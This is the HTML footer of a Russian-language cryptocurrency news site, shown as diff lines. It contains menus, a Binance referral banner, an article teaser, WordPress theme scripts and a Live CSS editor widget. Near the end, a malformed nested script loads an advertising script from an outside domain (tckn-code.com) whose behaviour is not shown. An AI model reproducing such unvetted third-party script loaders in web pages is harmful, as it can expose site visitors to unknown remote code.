+<li id="menu-item-185" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent td-menu-item td-normal-menu menu-item-185"><a href="http://bitcois.be/mining">Майнинг</a></li>
+<li id="menu-item-186" class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-normal-menu menu-item-186"><a href="http://bitcois.be/market">Технологии и рынок</a></li>
+<li id="menu-item-3007" class="menu-item menu-item-type-custom menu-item-object-custom td-menu-item td-normal-menu menu-item-3007"><a href="http://bitcois.be/coinmarket">Маркет</a></li>
+</ul></div></aside>		</div>
+
+		<div class="td-pb-span4">
+			<aside class="td_block_template_1 widget widget_block"><p align="center"><font color="#ffffff">ПОЖИЗНЕННАЯ СКИДКА 10% НА КОМИССИЮ ЗА ПРОДАЖИ НА BINANCE</font></p>
+<p><a href="https://accounts.binance.com/ru/register?ref=B5ZYFJ0T"><img src="http://bitcois.be/wp-content/uploads/2021/11/binance-partner.jpg" <="" a=""></a></p></aside>		</div>
+	</div>
+</div>
+
+    <!-- Sub Footer -->
+            <div class="td-sub-footer-container td-container td-container-border ">
+            <div class="td-pb-row">
+                <div class="td-pb-span8 td-sub-footer-menu">
+                    <div class="td-pb-padding-side">
+                        <div class="menu-menu-2-container"><ul id="menu-menu-5" class="td-subfooter-menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-first td-menu-item td-normal-menu menu-item-164"><a href="http://bitcois.be/about">О сайте</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-162"><a href="http://bitcois.be/sitemap">Карта сайта</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-163"><a href="http://bitcois.be/feedback">Обратная связь</a></li>
+</ul></div>                    </div>
+                </div>
+
+                <div class="td-pb-span4 td-sub-footer-copy">
+                    <div class="td-pb-padding-side">
+                        &copy; 2017 <a href="http://bitcois.be">Bitcois</a> - портал про криптовалюту                    </div>
+                </div>
+            </div>
+        </div>
+        </div><!--close td-outer-container-->
+</div><!--close td-outer-wrap-->
+
+                <div class="td-more-articles-box">
+                    <i class="td-icon-close td-close-more-articles-box"></i>
+                    <span class="td-more-articles-box-title">ЧИТАЙТЕ ТАКЖЕ</span>
+                    <div class="td-content-more-articles-box">
+
+                    
+        <div class="td_module_1 td_module_wrap td-animation-stack">
+            <div class="td-module-image">
+                <div class="td-module-thumb"><a href="http://bitcois.be/news/kriptoindustriya-uverenno-vnedryaetsya-v-povsednevnuyu-zhizn.html" rel="bookmark" title="Криптоиндустрия уверенно внедряется в повседневную жизнь"><img width="300" height="160" class="entry-thumb" src="http://bitcois.be/wp-content/uploads/2022/02/cryptocom-arena-300x160.jpg" alt="Криптоиндустрия уверенно внедряется в повседневную жизнь" title="Криптоиндустрия уверенно внедряется в повседневную жизнь"/></a></div>                            </div>
+            <h3 class="entry-title td-module-title"><a href="http://bitcois.be/news/kriptoindustriya-uverenno-vnedryaetsya-v-povsednevnuyu-zhizn.html" rel="bookmark" title="Криптоиндустрия уверенно внедряется в повседневную жизнь">Криптоиндустрия уверенно внедряется в повседневную жизнь</a></h3>
+            <div class="meta-info">
+                                <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2022-02-08T17:21:37+00:00" >08.02.2022</time></span>                <div class="td-module-comments"><a href="http://bitcois.be/news/kriptoindustriya-uverenno-vnedryaetsya-v-povsednevnuyu-zhizn.html#respond">0</a></div>            </div>
+
+            
+        </div>
+
+                            </div>
+                </div>
+
+    <!--
+
+        Theme: Newsmag by tagDiv.com 2017
+        Version: 4.0 (rara)
+        Deploy mode: deploy
+        
+        uid: 6aa563dbeffb1
+    -->
+
+    <script type="text/javascript"><script type="text/javascript">
+    (sc_adv_out = window.sc_adv_out || []).push(
+        {
+            id : "502039",
+            domain : "n.tckn-code.com"
+        }
+    );
+</script>
+<script type="text/javascript" src="//st-n.tckn-code.com/js/adv_out.js"></script></script><script type='text/javascript' src='http://bitcois.be/wp-includes/js/dist/vendor/regenerator-runtime.min.js?ver=0.13.9' id='regenerator-runtime-js'></script>
+<script type='text/javascript' src='http://bitcois.be/wp-includes/js/dist/vendor/wp-polyfill.min.js?ver=3.15.0' id='wp-polyfill-js'></script>
+<script type='text/javascript' id='contact-form-7-js-extra'>
+/* <![CDATA[ */
+var wpcf7 = {"api":{"root":"http:\/\/bitcois.be\/wp-json\/","namespace":"contact-form-7\/v1"},"cached":"1"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://bitcois.be/wp-content/plugins/contact-form-7/includes/js/index.js?ver=5.5.4' id='contact-form-7-js'></script>
+<script type='text/javascript' src='http://bitcois.be/wp-content/themes/theme/js/tagdiv_theme.min.js?ver=4.0' id='td-site-min-js'></script>
+<script type='text/javascript' src='http://bitcois.be/wp-includes/js/comment-reply.min.js?ver=5.9.16' id='comment-reply-js'></script>
+
+<!-- JS generated by theme -->
+
+<script>
+    
+
+	
+
+		(function(){
+			var html_jquery_obj = jQuery('html');
+
+			if (html_jquery_obj.length && (html_jquery_obj.is('.ie8') || html_jquery_obj.is('.ie9'))) {
+
+				var path = 'http://bitcois.be/wp-content/themes/theme/style.css';
+
+				jQuery.get(path, function(data) {
+
+					var str_split_separator = '#td_css_split_separator';
+					var arr_splits = data.split(str_split_separator);
+					var arr_length = arr_splits.length;
+
+					if (arr_length > 1) {
+
+						var dir_path = 'http://bitcois.be/wp-content/themes/theme';
+						var splited_css = '';
+
+						for (var i = 0; i < arr_length; i++) {
+							if (i > 0) {
+								arr_splits[i] = str_split_separator + ' ' + arr_splits[i];
+							}
+							//jQuery('head').append('<style>' + arr_splits[i] + '</style>');
+
+							var formated_str = arr_splits[i].replace(/\surl\(\'(?!data\:)/gi, function regex_function(str) {
+								return ' url(\'' + dir_path + '/' + str.replace(/url\(\'/gi, '').replace(/^\s+|\s+$/gm,'');
+							});
+
+							splited_css += "<style>" + formated_str + "</style>";
+						}
+
+						var td_theme_css = jQuery('link#td-theme-css');
+
+						if (td_theme_css.length) {
+							td_theme_css.after(splited_css);
+						}
+					}
+				});
+			}
+		})();
+
+	
+	
+</script>
+
+
+
+			<div id="tdw-css-writer" style="display: none" class="tdw-drag-dialog tdc-window-sidebar">
+				<header>
+
+				
+					<a title="Editor" class="tdw-tab tdc-tab-active" href="#" data-tab-content="tdw-tab-editor">Edit with Live CSS</a>
+					<div class="tdw-less-info" title="This will be red when errors are detected in your CSS and LESS"></div>
+				
+				</header>
+				<div class="tdw-content">
+
+					
+					<div class="tdw-tabs-content tdw-tab-editor tdc-tab-content-active">
+
+
+						<script>
+
+							(function(jQuery, undefined) {
+
+								jQuery(window).ready(function() {
+
+									if ( 'undefined' !== typeof tdcAdminIFrameUI ) {
+										var $liveIframe  = tdcAdminIFrameUI.getLiveIframe();
+
+										if ( $liveIframe.length ) {
+											$liveIframe.load(function() {
+												$liveIframe.contents().find( 'body').append( '<textarea class="tdw-css-writer-editor" style="display: none"></textarea>' );
+											});
+										}
+									}
+
+								});
+
+							})(jQuery);
+
+						</script>
+
+
+						<textarea class="tdw-css-writer-editor td_live_css_uid_1_6aa563dbf0131"></textarea>
+						<div id="td_live_css_uid_1_6aa563dbf0131" class="td-code-editor"></div>
+
+
+						<script>
+							jQuery(window).load(function (){
+
+								if ( 'undefined' !== typeof tdLiveCssInject ) {
+
+									tdLiveCssInject.init();
+
+
+									var editor_textarea = jQuery('.td_live_css_uid_1_6aa563dbf0131');
+									var languageTools = ace.require("ace/ext/language_tools");
+									var tdcCompleter = {
+										getCompletions: function (editor, session, pos, prefix, callback) {
+											if (prefix.length === 0) {
+												callback(null, []);
+												return
+											}
+
+											if ('undefined' !== typeof tdcAdminIFrameUI) {
+
+												var data = {
+													error: undefined,
+													getShortcode: ''
+												};
+
+												tdcIFrameData.getShortcodeFromData(data);
+
+												if (!_.isUndefined(data.error)) {
+													tdcDebug.log(data.error);
+												}
+
+												if (!_.isUndefined(data.getShortcode)) {
+
+													var regex = /el_class=\"([A-Za-z0-9_-]*\s*)+\"/g,
+														results = data.getShortcode.match(regex);
+
+													var elClasses = {};
+
+													for (var i = 0; i < results.length; i++) {
+														var currentClasses = results[i]
+															.replace('el_class="', '')
+															.replace('"', '')
+															.split(' ');
+
+														for (var j = 0; j < currentClasses.length; j++) {
+															if (_.isUndefined(elClasses[currentClasses[j]])) {
+																elClasses[currentClasses[j]] = '';
+															}
+														}
+													}
+
+													var arrElClasses = [];
+
+													for (var prop in elClasses) {
+														arrElClasses.push(prop);
+													}
+
+													callback(null, arrElClasses.map(function (item) {
+														return {
+															name: item,
+															value: item,
+															meta: 'in_page'
+														}
+													}));
+												}
+											}
+										}
+									};
+									languageTools.addCompleter(tdcCompleter);
+
+									window.editor = ace.edit("td_live_css_uid_1_6aa563dbf0131");
+
+									// 'change' handler is written as function because it's called by tdc_on_add_css_live_components (of wp_footer hook)
+									// We did it to reattach the existing compiled css to the new content received from server.
+									window.editorChangeHandler = function () {
+										//tdwState.lessWasEdited = true;
+
+										window.onbeforeunload = function () {
+											if (tdwState.lessWasEdited) {
+												return "You have attempted to leave this page. Are you sure?";
+											}
+											return false;
+										};
+
+										var editorValue = editor.getSession().getValue();
+
+										editor_textarea.val(editorValue);
+
+										if ('undefined' !== typeof tdcAdminIFrameUI) {
+											tdcAdminIFrameUI.getLiveIframe().contents().find('.tdw-css-writer-editor:first').val(editorValue);
+
+											// Mark the content as modified
+											// This is important for showing info when composer closes
+                                            tdcMain.setContentModified();
+										}
+
+										tdLiveCssInject.less();
+									};
+
+									editor.getSession().setValue(editor_textarea.val());
+									editor.getSession().on('change', editorChangeHandler);
+
+									editor.setTheme("ace/theme/textmate");
+									editor.setShowPrintMargin(false);
+									editor.getSession().setMode("ace/mode/less");
+									editor.setOptions({
+										enableBasicAutocompletion: true,
+										enableSnippets: true,
+										enableLiveAutocompletion: false
+									});
+
+								}
+
+							});
+						</script>
+
+					</div>
+				</div>
+
+				<footer>
+
+					
+						<a href="#" class="tdw-save-css">Save</a>
+						<div class="tdw-more-info-text">Write CSS OR LESS and hit save. CTRL + SPACE for auto-complete.</div>
+
+					
+					<div class="tdw-resize"></div>
+				</footer>
+			</div>
+			
+</body>
+</html>
+
+<!-- Page cached by LiteSpeed Cache 7.8.0.1 on 2026-09-12 17:38:19 -->
